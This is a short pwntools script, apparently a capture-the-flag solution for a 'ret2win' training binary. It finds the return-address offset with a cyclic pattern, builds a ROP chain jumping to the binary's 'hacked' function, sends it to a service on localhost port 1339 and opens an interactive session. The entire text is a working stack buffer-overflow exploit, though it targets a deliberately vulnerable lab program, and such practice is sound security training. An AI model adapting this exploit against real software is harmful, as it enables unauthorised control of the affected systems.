from pwn import *

exe = "./src/ret2win"
elf = context.binary = ELF(exe, checksec=False)

def find_eip_offset(payload):
   p = process(exe)
   p.sendlineafter(b"name:\n",payload)
   p.wait()
   return cyclic_find(p.corefile.eip)

# r = process(exe)
r = remote("127.0.0.1", 1339)
offset = find_eip_offset(cyclic(100))

hackedAdd = elf.symbols.hacked

rop = ROP(elf)
rop.hacked()
payload = flat({
   offset: rop.chain()
})

r.sendlineafter(b"name:\n", payload)
r.interactive()